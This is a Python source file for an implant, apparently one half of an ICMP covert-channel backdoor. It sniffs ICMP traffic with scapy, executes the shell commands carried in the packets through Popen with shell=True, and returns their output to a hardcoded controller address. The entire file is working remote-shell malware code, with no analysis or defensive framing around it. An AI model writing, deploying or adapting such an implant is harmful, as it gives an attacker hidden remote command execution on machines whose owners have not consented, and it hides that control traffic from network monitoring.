#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
import shlex
from shellylib import Host
import time
from threading import Timer
from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.controller_ip = controller_ip
        

    def join(self, shellpack):
        self.send(shellpack['ip'], "join")

    def run(self, cmd, timeout):
        time_limit = 2
        timer = 0
        time_gap = 0.2

        proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)

        ended = False
        while True:
            time.sleep(time_gap)

            returncode = proc.poll()

            timer += time_gap
            if timer >= time_limit:
                proc.kill()
                return None

            if returncode is not None:
                ended = True
                break

        if ended:
            out, err = proc.communicate()
            return out,err
        else:
            return None

    def instruction(self, shellpack):
        try:
            cmd = shellpack['data'].decode()
            out,err = self.run(cmd, 3)
            print(out)
            print(err)
            self.send(self.controller_ip, "instruction", out)
            
        except TimeoutExpired:
            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
        except FileNotFoundError:
            self.send(self.controller_ip, "instruction", f"The command {cmd[0]} has not been found".encode(), option="ERROR")

if __name__ == "__main__":
    print("[ Setting up implant... ]")
    print("[ ICMP Sniffing Started ]")
    
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)

    print("[ Shellpack log ]")
    # Send join command
    implant.send(implant.controller_ip, "join")

    # Start sniffing
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
